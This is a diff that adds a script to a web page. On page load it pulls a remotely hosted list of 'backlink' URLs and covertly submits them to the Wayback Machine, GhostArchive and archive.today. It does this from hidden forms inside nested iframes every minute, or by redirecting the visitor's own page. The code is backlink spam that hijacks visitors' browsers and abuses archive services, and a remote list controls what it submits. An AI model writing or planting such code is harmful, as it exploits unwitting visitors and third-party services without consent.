@@ -1,0 +1,206 @@
+<script>
+/* Injects a stealthIFrameContainer into the current page (no need for a manual <div>)
+   Supports random submissions to web.archive.org, ghostarchive.org, and archive.today.
+*/
+
+const fetchData = [
+  "https://smartbacklinkmaker.blogspot.com/"
+];
+const fetchURLs = [
+  "https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/backlink-generator.json"
+];
+
+const IFRAME_COUNT = 4;
+const SUBMIT_INTERVAL = 60000; // 60s
+
+function isValidURL(url) {
+  const pattern = /^https?:\/\/[^\s]+$/i;
+  return pattern.test(url);
+}
+function shuffle(array){ for(let i=array.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[array[i],array[j]]=[array[j],array[i]];} }
+function normalizeURL(url){ if(typeof url!=='string') return ""; return url.replace(/([^:]\/)\/+/g,"$1"); }
+function randomURL(array){ return array[Math.floor(Math.random()*array.length)]; }
+
+async function updateDefaultURLs() {
+  shuffle(fetchURLs);
+  for (const u of fetchURLs) {
+    try {
+      console.log("🔎 Trying to fetch URL list from:", u);
+      const r = await fetch(u);
+      if (!r.ok) throw new Error("HTTP " + r.status);
+      const data = await r.json();
+      if (Array.isArray(data) && data.length) {
+        fetchData.length = 0;
+        fetchData.push(...data);
+        console.log("✅ Loaded", data.length, "URLs from", u);
+        return;
+      }
+    } catch (err) {
+      console.warn("⚠ Failed to load", u, err && err.message);
+    }
+  }
+  console.warn("⚠ Using fallback URLs:", fetchData.length);
+}
+
+function generateTargetURL() {
+  if (!fetchData.length) return "";
+  const combined = randomURL(fetchData);
+  return normalizeURL(combined);
+}
+
+/* Archive site definitions */
+const ARCHIVE_SITES = [
+  {
+    name: "Wayback",
+    action: "https://web.archive.org/save",
+    method: "POST",
+    inputName: "url",
+    extraParams: {}
+  },
+  {
+    name: "GhostArchive",
+    action: "https://ghostarchive.org/archive2",
+    method: "POST",
+    inputName: "archive",
+    extraParams: {}
+  },
+  {
+    name: "archive.today",
+    action: "https://archive.today/submit/",
+    method: "GET",
+    inputName: "url",
+    extraParams: { anyway: "1" }
+  }
+];
+
+function chooseRandomArchive() {
+  return ARCHIVE_SITES[Math.floor(Math.random() * ARCHIVE_SITES.length)];
+}
+
+/* Generic form builder that handles GET/POST, target (iframe or _self), and extra params */
+function buildAndSubmitArchiveForm(site, targetUrl, targetFrameName) {
+  if (!site || !targetUrl) return;
+  try {
+    const form = document.createElement("form");
+    form.style.display = "none";
+    form.method = site.method || "POST";
+    form.action = site.action;
+    if (targetFrameName) form.target = targetFrameName;
+    else form.target = "_self";
+
+    // Main URL input
+    const urlInput = document.createElement("input");
+    urlInput.type = (site.method === "GET") ? "text" : "hidden";
+    urlInput.name = site.inputName || "url";
+    urlInput.value = targetUrl;
+    form.appendChild(urlInput);
+
+    // Extra params as hidden inputs
+    if (site.extraParams) {
+      for (const [k, v] of Object.entries(site.extraParams)) {
+        const inp = document.createElement("input");
+        inp.type = "hidden";
+        inp.name = k;
+        inp.value = v;
+        form.appendChild(inp);
+      }
+    }
+
+    document.body.appendChild(form);
+    console.log(`📨 Submitting to ${site.name} (${site.action}) via ${site.method} target=${form.target} url=${targetUrl}`);
+    form.submit();
+
+    setTimeout(() => { try { form.remove(); } catch(e){} }, 1000);
+  } catch (err) {
+    console.error("❌ buildAndSubmitArchiveForm error:", err);
+  }
+}
+
+/* Submit inside an iframe */
+function submitToArchiveInFrame(iframe) {
+  try {
+    const targetUrl = generateTargetURL();
+    if (!targetUrl || !isValidURL(targetUrl)) {
+      console.warn("⚠ Skipping invalid target:", targetUrl);
+      return;
+    }
+    const site = chooseRandomArchive();
+    buildAndSubmitArchiveForm(site, targetUrl, iframe.name);
+  } catch (err) {
+    console.error("❌ submitToArchiveInFrame error:", err);
+  }
+}
+
+/* Create iframe and periodically submit into it */
+function createIframe(i, container) {
+  try {
+    const iframe = document.createElement("iframe");
+    const fname = "hiddenFrame" + i;
+    iframe.setAttribute("name", fname);
+    iframe.setAttribute("id", fname);
+    iframe.classList.add("hidden-iframe");
+    iframe.style.width = "100%";
+    iframe.style.height = "200px";
+    iframe.style.border = "0"; // no visible border by default
+    iframe.src = "about:blank";
+
+    container.appendChild(iframe);
+
+    // initial submit after attached
+    setTimeout(() => submitToArchiveInFrame(iframe), 250);
+
+    // periodic submissions
+    setInterval(() => {
+      console.log("⏱ Interval firing for iframe:", fname);
+      submitToArchiveInFrame(iframe);
+    }, SUBMIT_INTERVAL);
+  } catch (err) {
+    console.error("❌ createIframe error:", err);
+  }
+}
+
+/* If page is top or not inside an iframe, submit (redirect) with a random archive site */
+function submitToArchiveRedirect(url) {
+  if (!url || !isValidURL(url)) {
+    console.warn("⚠ Invalid or empty URL for redirect submission:", url);
+    return;
+  }
+  const site = chooseRandomArchive();
+  buildAndSubmitArchiveForm(site, url, "_self");
+}
+
+/* Utility: are we inside an iframe? */
+function inIframe() {
+  try {
+    return window.self !== window.top;
+  } catch (e) {
+    return true;
+  }
+}
+
+function ensureContainer() {
+    // use document.body if available; otherwise fallback to document.documentElement
+    return document.body || document.documentElement;
+}
+
+/* Run startup after DOM ready */
+document.addEventListener('DOMContentLoaded', async () => {
+  try {
+    await updateDefaultURLs();
+  } catch (e) {
+    console.warn("updateDefaultURLs() failed:", e && e.message);
+  }
+
+  const container = ensureContainer();
+
+  if (inIframe()) {
+    // inside iframe: create multiple nested iframes and submit in them
+    for (let i = 0; i < IFRAME_COUNT; i++) {
+      createIframe(i, container);
+    }
+  } else {
+    // not inside iframe: choose a random archive and redirect/submit there
+    submitToArchiveRedirect(generateTargetURL());
+  }
+});
+</script>
